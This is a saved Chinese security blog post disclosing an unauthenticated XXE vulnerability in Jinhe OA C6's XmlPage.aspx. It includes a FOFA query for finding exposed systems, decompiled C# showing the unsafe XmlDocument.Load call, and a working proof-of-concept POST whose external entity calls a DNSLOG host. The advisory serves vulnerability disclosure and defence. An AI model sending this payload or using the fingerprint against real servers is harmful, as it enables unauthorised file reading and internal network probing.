---
title: "金和OA XmlPage.aspx XXE漏洞"
source: https://mrxn.net/jswz/jhsoft-XmlPage-xxe.html
asset_dir: assets/金和oa-xmlpage.aspx-xxe漏洞
---

# 金和OA XmlPage.aspx XXE漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/12/2 13:31
* 266浏览
* [0评论](#comment)
* 19分钟阅读

深入探索

漏洞扫描服务

安全认证考试

物流软件安全


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

金和网络是专业信息化服务商,为城市监管部门提供了互联网+监管解决方案,为企事业单位提供组织协同OA系统开发平台,电子政务一体化平台,智慧电商平台等服务。金和OA C6 `XmlPage.aspx` 接口处存在[XXE](https://mrxn.net/tag/XXE)漏洞，未授权的攻击者可以通过此漏洞读取服务器上敏感文件或探测内网服务信息，进一步利用可导致服务器失陷。

漏洞扫描服务

# 影响版本

金和OA C6

# fofa语法

> app="金和网络-金和OA"

# 漏洞分析

直接根据 `XmlPage.aspx` 在 `bin` 目录下查找 `JHSoft.Web.Calendar.dll` 将其进行反编译后找到 **XmlPage** 的处理逻辑

```
protected void Page_Load(object sender, EventArgs e)
{
  if (this.Session["UserCode"] != null)
    this.SessonUserCode = this.Session["UserCode"].ToString();
  string empty = string.Empty;
  if (this.Request.QueryString["val"] != null)
    empty = this.Request.QueryString["val"].ToString();
  string str1 = string.Empty;
  if (this.Request.QueryString["gettype"] != null)
    str1 = this.Request.QueryString["gettype"].ToLower();
  string str2 = string.Empty;
  if (this.Request.QueryString["ishave"] != null)
    str2 = this.Request.QueryString["ishave"].ToLower();
  if (this.Request.Form["year"] != null && this.Request.Form["month"] != null)
  {
    this.strYear = this.Request.Form["year"].ToString();
    this.strMonth = this.Request.Form["month"].ToString();
  }
  if (string.op_Inequality(this.strYear, ""))
    this.SearchCalendar();
  if (string.op_Inequality(empty, string.Empty))
  {
    if (string.op_Equality(empty, "con"))
    {
      XmlDocument xmlDocument = new XmlDocument();
      xmlDocument.Load(this.Request.InputStream);
      this.SaveFile(xmlDocument.DocumentElement.SelectSingleNode("//root//SaveContent").InnerText);
      xmlDocument.RemoveAll();
    }
    else
      this.Resource(empty.Split(new char[1]{ '$' }));
  }
```

当**val=con**时，请求内容直接使 `XmlDocument.Load` 解析，造成[XXE](https://mrxn.net/tag/XXE)漏洞。

# 漏洞复现

```
POST /c6/Jhsoft.Web.calendar/XmlPage.aspx/?val=con HTTP/1.1
Host: jhsoft.mrxn.net

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://xxe.dnslog.pt/xxe_test">
%remote;]>
<root/>
```

深入探索

网络安全会议

恶意软件分析工具

漏洞预警服务

在DNSLOG平台成功收到请求

漏洞扫描服务

[![金和OA XmlPage.aspx XXE漏洞](images/img-001-5d9754b7ff40.webp)](https://image.mrxn.net/2717331bf52c4dd0a3f322019ceaf880.webp)

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#0day](https://mrxn.net/tag/0day)
* [#XXE](https://mrxn.net/tag/XXE)
* [#asp.net](https://mrxn.net/tag/asp.net)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[金和OA XmlPage.aspx XXE漏洞](https://mrxn.net/jswz/jhsoft-XmlPage-xxe.html)  
文章链接：<https://mrxn.net/jswz/jhsoft-XmlPage-xxe.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/jhsoft-XmlPage-xxe.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

文件大小转换

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAAKUUlEQVR4AeybgZobNw6D8+f937m3GBYSLXHkcdZr+xrdFxYUAFKz4ih22tzvX79+/fPd+Gfxv1XvXFb5sq78ike+HGPNSsve7LuS59rv5BrIV/3+9Skn0Aby9Rb8eiSqHwD4BVRS2Rs4/EBZYxI4fNXzQWiA7SW6NovmKsw+4NgfZsw+51W/Fec6YRuIFjvefwLTQGB+C6Bzq0f2W5A95uCxHqpzH+UKr4UQ/cQ7IDjpZwHhAZoFaDfAJMyc98lof4XQe8CcVzXTQCrT5l53AnsgrzvrSzv9yEBgvp7VNa+46qnhvF/lz5z3gOjhtRCCy36YOXkVEBqQS56a/8hAnvqEf1mzHx+I3ixFPlfg+BDNnDwKCA06Zp9zCN1roeoVyscQr4CoA0bLsZZHcSyGf4h3DNLTlj8zkKc93t/XaA/kw2Y+DcRX8gxXzw8cvxXl2spvHcIPHa1lrHqYg1674qzlvlVe+cxB3wsit1Zh1T9zVc00kMq0udedQBsIxMThGl59RIh+2Q/B3Xtb4NaXe7g2c6scolf2wGOc9xTmPmMO0ReuYa5vA8nkzt93Ansg7zv7cuffun7fjbLzv6R7/7s8wBz0K23uMJz8wx4hRK1yBwSXy+GWg1gDzQYcX0aA9p8JoHM2Que8pzWvv4v7hvhEPwQvDQT6mwHnud8OOPcA7Ue3X2gSaG+ruauoPoqrfvtU4zCX0VpGiOe0D2INHa2dIYQ365cGkgvemP8VW/+GmBKcY3US+W1xbp/XwhUHfU/7KoTwZU29FRAakOUpl/csgHYrIfKpwUC410DfLCF6QcdsqHrsG5JP6APyPZAPGEJ+hEtfe3OBrxnU11BemDWYOXnHcP+M9sDcI/sg9Mw5X/Ww9ghC7AWBudZ7Vph9ELXQcd+QfEIfkLeBQJ8S3OZ50hBaxcGsZZ9z/9xeC809AyGeA7jUTvuPURUC7cPfuuu8FkL4lDtg5qxlbAPJ5M7fdwJ7IO87+3Ln9ucQq76CQnMZxSsgriD0f/8jXpH9zqH7zVUI5z71dkD3QeSrftZcL4Sogxntz6gaR+aVmxdqPYZ4xciP631DxhN583r62ls9D8xvkKbtGGvgMX+ud08hRB/rEGvot9KaUDUK5WcBvYc9qhnDWkbotfZDcNnnHEIDTLUvBVD/DPuGtKP6jGQP5DPm0J7i4YGMVxXm62iP0DsBN9cV7q9Vfxbuew9dD7Gf1xkhNOBeu1MdaD+fe1dma8JKf3ggVZPNPe8Epq+90CftbTRNB4TutRCCsx9iDZhq/2lU/lW0gpQA7e2DyC3nXnCryQMzJ/4s4Jofwpf3dw6zVu0H4cvaviH5ND4g3wP5gCHkR2h/Dsmkc19BrzNCXDeYv0+7Tphrxhx6j1HTGkJXnzGkPxKuh+gJtHJrwkYWifQxCltJAcdvu1l0r8ztG5JP43n5H3dqH+oQE/TUhBAcdPRO0h3mjND9lQdCtyZ0bUbxCgg/dLQPZk41Y0D4XJcRQgMy3XJgerstQmjQsdL8PNaEEDXKHfuG+CQ+BKfPEIipQf9s8HSFfm7oPohc+hj2VwhRBzQ51wM3b+ZKaw0eSOC2fy7Ne2XeOUStfeYzWhNC+Cs9c/uG5NP4gHwP5AOGkB+hDUTXagyYr5mLs9fcVXRt9kPsBR3tM2a/c2tCc89G9Vas+kp3rHz3tDaQe8atv+YE2tfeartq4uagv8muheC8FsLMiVe41xnCbS3EGlD5aQDHlwHoaHO1l7U/QYg9cq33gNCALLccOJ7TfuG+Ie14PiPZA/mMObSnWP45BOJKwYy6XmcB3W8PdA7m3E8EXTNXoftmzdwKs/9qDvFM2e89zEF4oKM9Ge0Xmodes2+ITuaDog0EYkqe2hn62SH8MGOutT9j1p1n3fmoeS2E2NfeewiP+XM/7afIHEQ/8YqsOYfwAKaOD3HgwEampA0kcTt94wnsgbzx8Kut20B07RQQ1wlqlGcMNzYPvXbU5IGuQ+T2ZYTQIDBr6qOA0IAstxy4+e0BYg0d1WcM6LqbwcxZG+u1tiaEqFW+ijaQlWlrrzuB5UA0ZUX1OBATh/6v6SG4yp859VRkzrl4x8hB9IeO9mSEro+9sm+lZZ9z+4XmIPbyOqN8jsw7h7l2ORAXbnzdCUwD8USFfgzljiucPRkh3gbo6J7C7HUuXuH1PYTorRrHWGNeCOGHjvZLd5ir0B7oPWDO7cs9Km4aSC74mXx3XZ3AHsjqdN6gtYFAXLP8DBAcXMNc6xyi1mthdVVh9sHMqV5R9TAHUQcdK82c+jkgary+iu4ldI1yx4qzJmwD0WLH+0+gDcSThHhDoH+dtSb0IysfA6LWnjOE2edeuWbkvBZm3yqXVwGxp3IHzNyoQXjgFr0nBO/1GcI1XxvIWaPNv/YE9kBee953d2sDgWtXyh0h/ICpEv1bQCkmEjj+nRPMmGxT6v5CiFrlDghuKvwiRg/wxc6/7KvQbqA9v7mMrs0cRE3m2kAyufP3nUD7WyeeYEY/FsQk4doHvesy/klf10DfHyLPvZ3b77Ww4sTnsEcI0V+5A4KDGe3J6N7Q/eYqzLX/mRtS/aD/j9weyIdN7dLfOslXCvo1hNvcP1vltya0rtwBt70AS+X/YdQiMH2YQucgcvszwn0NaCV+bqFJ4Njf6zOE8EFH9VFA5/YNOTvBN/EPD0QTPQuISd/7WeDcl3vDrQ9iDR3zXhB85la598qeisu686s++42uE5rL+PBAcvHOn38CeyDPP9NvdWx/DoG47rpKY0BoQNsMOD7MoGMTU+Je0H3mkq19cEP3WYfgvBa6R4XSHda9zgjRFzpmfcyh+yByeyDWgKm7CBxnmI37huTT+IC8fe1dvUnWhH5m5WNYqzB7rWcO4m3JXOWzbq1Ce4QQfe2DWAOmbhA43lrVOm4Mw8KeCrPV+j1u35B8QlP+emL6DIF4Q+A6/tRjj28VrJ/pynO4p3Dlh76XvIqr/pXvnrZvyL0TerG+B/LiA7+3XRuIruQjsWoM/bpD5NkPwUFH7519ziF89pyh/RntNQfRCzDVvnLbK2ziVwLc/aBXjeOrZPoF0SMLEJzrhG0g2bjz953ANBCIqUGNVx5Vk3Zc8d/zrHpBf073gc5B5NbcS2gOwgOYurk1JoHjpgCm2hqY8mb6SrSfArrviz5+QeemgRyO/Y+3ncAeyNuOvt74qQPRlVRAv4LeFmZOXgeEbr8QgoMZpY8B4XNP4ejJa+mKzEH0gI7yjOGakde60iD6WRPKq1DueOpA3HTj+gRW6lsGordCAfHWQP/bLNXDyjsGRG3221NxlZZ9zlc+iD2hPy8E53rhqoc1Icy1bxmIHnpHfQJ7IPW5vI2dBqKrtIorT5rrKz/MVxVmrqo15z28FkL0gI7izwLC517CM6946Q6IWvFjwKy5bvSO62kgo2GvX3sCbSAQU4VruHpM6D0q3+ptgV5rHwRX9cqc/RkhamFG+6Brud+Yw+xb9YDZDzPnHsI2kHHzvX7PCeyBvOfcT3f9HwAAAP//qWg8NAAAAAZJREFUAwB+Gli8nIaynAAAAABJRU5ErkJggg==)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/jhsoft-XmlPage-xxe.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 